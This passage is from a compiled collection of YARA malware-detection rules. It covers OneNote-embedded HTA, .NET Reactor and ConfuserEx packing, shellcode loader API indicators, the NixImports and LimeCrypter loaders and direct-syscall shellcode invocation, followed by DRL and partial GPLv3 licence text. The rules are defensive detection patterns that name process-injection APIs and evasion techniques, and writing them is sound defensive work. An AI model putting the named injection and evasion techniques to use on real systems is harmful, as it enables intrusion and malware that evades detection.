		id = "8cebd862-8dfb-5f5d-befb-5c41cde945ff"
		date = "2023-02-01"
		modified = "2023-02-02"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/rules/HTA_OneNote.yara#L1-L17"
		license_url = "https://github.com/elceef/yara-rulz/blob/5683b294a12cf0c875b624933586029ae43a852f/LICENSE"
		hash = "002fe00bc429877ee2a786a1d40b80250fd66e341729c5718fc66f759387c88c"
		logic_hash = "0287ac5d618c9a8332d167f1a05157aa829c7e8a052c35100fcaeb644d452e5c"
		score = 65
		quality = 75
		tags = "FILE"

	strings:
		$magic = { ae b1 53 78 d0 29 96 d3 }
		$hta = { 00 04 00 00 00 2e 00 68 00 74 00 61 }
		$wsh = "CreateObject(\"WScript.Shell\")"

	condition:
		filesize < 5MB and $magic at 8 and $wsh and $hta
}
/*
 * YARA Rule Set
 * Repository Name: Cod3nym
 * Repository: https://github.com/cod3nym/detection-rules/
 * Retrieval Date: 2026-11-22
 * Git Commit: a9f1cbab38406194d4451de021c0aeb309ac8baa
 * Number of Rules: 7
 * Skipped: 0 (age), 2 (quality), 5 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 * ## Detection Rule License (DRL) 1.1

Permission is hereby granted, free of charge, to any person obtaining a copy 
of this rule set and associated documentation files (the "Rules"), to deal 
in the Rules without restriction, including without limitation the rights to 
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies 
of the Rules, and to permit persons to whom the Rules are furnished to do so, 
subject to the following conditions:

If you share the Rules (including in modified form), you must retain the 
following if it is supplied within the Rules:

1. identification of the authors(s) ("author" field) of the Rule and any 
   others designated to receive attribution, in any reasonable manner 
   requested by the Rule author (including by pseudonym if designated).

2. a URI or hyperlink to the Rule set or explicit Rule to the extent 
   reasonably practicable

3. indicate the Rules are licensed under this Detection Rule License, and 
   include the text of, or the URI or hyperlink to, this Detection Rule 
   License to the extent reasonably practicable

If you use the Rules (including in modified form) on data, messages based on 
matches with the Rules must retain the following if it is supplied within the 
Rules:

1. identification of the authors(s) ("author" field) of the Rule and any 
   others designated to receive attribution, in any reasonable manner 
   requested by the Rule author (including by pseudonym if designated).

THE RULES ARE PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
OUT OF OR IN CONNECTION WITH THE RULES OR THE USE OR OTHER DEALINGS IN THE 
RULES.

 */

rule COD3NYM_SUSP_OBF_NET_Reactor_Native_Stub_Jan24
{
	meta:
		description = "Detects native packer stub for version 4.5-4.7 of .NET Reactor. A pirated copy of version 4.5 of this commercial obfuscation solution is used by various malware families like BlackBit, RedLine, AgentTesla etc."
		author = "Jonathan Peters"
		id = "529dce88-a81d-5a98-aa6c-1f1b739ad074"
		date = "2024-01-05"
		modified = "2024-01-12"
		reference = "https://notes.netbytesec.com/2023/08/understand-ransomware-ttps-blackbit.html"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/obf_net_reactor.yar#L3-L16"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "6e8a7adf680bede7b8429a18815c232004057607fdfbf0f4b0fb1deba71c5df7"
		logic_hash = "287273babd3cd6bc1986b018367317019f2249851a2c19fc83857f7ff0b90b54"
		score = 70
		quality = 80
		tags = ""

	strings:
		$op = {C6 44 24 18 E0 C6 44 24 19 3B C6 44 24 1A 8D C6 44 24 1B 2A C6 44 24 1C A2 C6 44 24 1D 2A C6 44 24 1E 2A C6 44 24 1F 41 C6 44 24 20 D3 C6 44 24 21 20 C6 44 24 22 64 C6 44 24 23 06 C6 44 24 24 8A C6 44 24 25 F7 C6 44 24 26 3D C6 44 24 27 9D C6 44 24 28 D9 C6 44 24 29 EE C6 44 24 2A 15 C6 44 24 2B 68 C6 44 24 2C F4 C6 44 24 2D 76 C6 44 24 2E B9 C6 44 24 2F 34 C6 44 24 30 BF C6 44 24 31 1E C6 44 24 32 E7 C6 44 24 33 78 C6 44 24 34 98 C6 44 24 35 E9 C6 44 24 36 6F C6 44 24 37 B4}

	condition:
		for any i in ( 0 .. pe.number_of_resources -1 ) : ( pe.resources [ i ] . name_string == "_\x00_\x00" ) and $op
}
rule COD3NYM_SUSP_OBF_NET_Reactor_Indicators_Jan24 : FILE
{
	meta:
		description = "Detects indicators of .NET Reactors managed obfuscation. Reactor is a commercial obfuscation solution, pirated versions are often abused by threat actors."
		author = "Jonathan Peters"
		id = "8dc07bbd-cbeb-5214-a27a-555a0d396197"
		date = "2024-01-09"
		modified = "2024-01-12"
		reference = "https://www.eziriz.com/dotnet_reactor.htm"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/obf_net_reactor.yar#L18-L34"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "be842a9de19cfbf42ea5a94e3143d58390a1abd1e72ebfec5deeb8107dddf038"
		logic_hash = "40a03eb487e2c02a032c4bfb51580dbb764e0a49ceee5ae92c54a5ee3ede9696"
		score = 65
		quality = 80
		tags = "FILE"

	strings:
		$ = { 33 7B 00 [9] 00 2D 00 [9] 00 2D 00 [9] 00 2D 00 [9] 00 7D 00 }
		$ = { 3C 50 72 69 76 61 74 65 49 6D 70 6C 65 6D 65 6E 74 61 74 69 6F 6E 44 65 74 61 69 6C 73 3E 7B [8] 2D [4] 2D [4] 2D [4] 2D [12] 7D }
		$ = { 3C 4D 6F 64 75 6C 65 3E 7B [8] 2D [4] 2D [4] 2D [4] 2D [12] 7D }

	condition:
		uint16( 0 ) == 0x5a4d and 2 of them
}
rule COD3NYM_SUSP_OBF_NET_Confuserex_Packer_Jan24 : FILE
{
	meta:
		description = "Detects binaries packed with ConfuserEx compression packer. This feature compresses and encrypts the actual image into a stub that unpacks and loads the original image on runtime."
		author = "Jonathan Peters"
		id = "cd53a62f-62e3-58a1-8bc3-7f40949e3f00"
		date = "2024-01-09"
		modified = "2024-01-09"
		reference = "https://github.com/yck1509/ConfuserEx/tree/master"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/obf_confuserex.yar#L23-L42"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "2570bd4c3f564a61d6b3d589126e0940af27715e1e8d95de7863579fbe25f86f"
		logic_hash = "43aee4c01b47ca04ee516d418939ec3e90fd08566f2a4b501c4698b7f9e0225d"
		score = 70
		quality = 80
		tags = "FILE"

	strings:
		$s1 = "GCHandle" ascii
		$s2 = "GCHandleType" ascii
		$op1 = { 5A 20 89 C0 3F 14 6A 5E [8-20] 5A 20 FB 56 4D 44 6A 5E 6D 9E }
		$op2 = { 20 61 FF 6F 00 13 ?? 06 13 ?? 16 13 [10-20] 20 1F 3F 5E 00 5A}
		$op3 = { 16 91 7E [3] 04 17 91 1E 62 60 7E [3] 04 18 91 1F 10 62 60 7E [3] 04 19 91 1F 18 62 }

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* ) and 2 of ( $op* )
}
rule COD3NYM_SUSP_NET_Shellcode_Loader_Indicators_Jan24 : FILE
{
	meta:
		description = "Detects indicators of shellcode loaders in .NET binaries"
		author = "Jonathan Peters"
		id = "606a444a-b894-5076-8d5e-1716bbfa588e"
		date = "2024-01-11"
		modified = "2024-01-12"
		reference = "https://github.com/Workingdaturah/Payload-Generator/tree/main"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/suspicious_indicators.yar#L1-L22"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "c48752a5b07b58596564f13301276dd5b700bd648a04af2e27d3f78512a06408"
		logic_hash = "28267eb54a4108924df57512bbae9f47f51fd4860b3cf93c014d73b0d4b2dec2"
		score = 65
		quality = 80
		tags = "FILE"

	strings:
		$sa1 = "VirtualProtect" ascii
		$sa2 = "VirtualAlloc" ascii
		$sa3 = "WriteProcessMemory" ascii
		$sa4 = "CreateRemoteThread" ascii
		$sa5 = "CreateThread" ascii
		$sa6 = "WaitForSingleObject" ascii
		$x = "__StaticArrayInitTypeSize=" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 3 of ( $sa* ) and #x == 1
}
rule COD3NYM_MAL_NET_Niximports_Loader_Jan24 : FILE
{
	meta:
		description = "Detects open-source NixImports .NET malware loader. A stealthy loader using dynamic import resolving to evade static detection"
		author = "Jonathan Peters"
		id = "f36ad127-4c4b-5b7e-a13c-bfb9d222a438"
		date = "2024-01-12"
		modified = "2024-01-12"
		reference = "https://github.com/dr4k0nia/NixImports/tree/master"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/mal/mal_net_niximports_loader.yar#L1-L22"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "dd3f22871879b0bc4990c96d1de957848c7ed0714635bb036c73d8a989fb0b39"
		logic_hash = "e41d7f4cb46aa0baa87d3024e0550efe5058ca49d908bbd34197431c7c054e58"
		score = 80
		quality = 80
		tags = "FILE"

	strings:
		$op1 = { 1F 0A 64 06 1F 11 62 60 }
		$op2 = { 03 20 4D 5A 90 00 94 4B 2A }
		$op3 = { 20 DE 7A 1F F3 20 F7 1B 18 BC }
		$op4 = { 20 CE 1F BE 70 20 DF 1F 3E F8 14 }
		$sa1 = "OffsetToStringData" ascii
		$sa2 = "GetRuntimeMethods" ascii
		$sa3 = "netstandard" ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $sa* ) and 2 of ( $op* )
}
rule COD3NYM_MAL_NET_Limecrypter_Runpe_Jan24 : FILE
{
	meta:
		description = "Detects LimeCrypter RunPE module. LimeCrypter is an open source .NET based crypter and loader commonly used by threat actors"
		author = "Jonathan Peters"
		id = "06ecd638-0102-5762-b363-fdc390dda04b"
		date = "2024-01-16"
		modified = "2024-01-16"
		reference = "https://github.com/NYAN-x-CAT/Lime-Crypter/tree/master"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/dotnet/mal/mal_net_limecrypter_runpe.yar#L1-L22"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "bcc8c679acfc3aabf22ebdb2349b1fabd351a89fd23a716d85154049d352dd12"
		logic_hash = "b01a68c60d62cf94ef16340316acb9b96d1e671c372559b86a8e6a5d8e80f7d9"
		score = 80
		quality = 80
		tags = "FILE"

	strings:
		$op1 = { 1F 1A 58 1F 1A 58 28 }
		$op2 = { 20 B3 00 00 00 8D ?? 00 00 01 13 ?? 11 ?? 16 20 02 00 01 00 }
		$op3 = { 11 0? 11 0? 20 00 30 00 00 1F 40 28 ?? 00 00 06 }
		$op4 = { 6E 20 FF 7F 00 00 6A FE 02 }
		$s1 = "RawSecurityDescriptor" ascii
		$s2 = "CommonAce" ascii

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $s* ) and 2 of ( $op* )
}
rule COD3NYM_SUSP_Direct_Syscall_Shellcode_Invocation_Jan24 : FILE
{
	meta:
		description = "Detects direct syscall evasion technqiue using NtProtectVirtualMemory to invoke shellcode"
		author = "Jonathan Peters"
		id = "2a0ce887-299d-5aad-bed3-3e698b4dea79"
		date = "2024-01-14"
		modified = "2024-01-14"
		reference = "https://unprotect.it/technique/evasion-using-direct-syscalls/"
		source_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/yara/other/susp_direct_syscall_shellcode_invocation.yar#L1-L14"
		license_url = "https://github.com/cod3nym/detection-rules//blob/a9f1cbab38406194d4451de021c0aeb309ac8baa/LICENSE.md"
		hash = "f7cd214e7460c539d6f8d02b6650098e3983862ff658b76ea02c33f5a45fc836"
		logic_hash = "b5b0ad86289a4e2af7cdc909192f4dc9325c1763259f40adcc1e60c088c9e4f3"
		score = 65
		quality = 80
		tags = "FILE"

	strings:
		$ = { B8 40 00 00 00 67 4C 8D 08 49 89 CA 48 C7 C0 50 00 00 00 0F 05 [4-8] 4C 8D 3D 02 00 00 00 FF E0 }

	condition:
		all of them and filesize < 2MB
}
/*
 * YARA Rule Set
 * Repository Name: craiu
 * Repository: https://github.com/craiu/yararules
 * Retrieval Date: 2026-11-22
 * Git Commit: 23cf0ca22021fa3684e180a18416b9ae1b695243
 * Number of Rules: 7
 * Skipped: 4 (age), 2 (quality), 0 (score), 0 (importance)
 *
 * 
 * LICENSE
 * 
 *                     GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

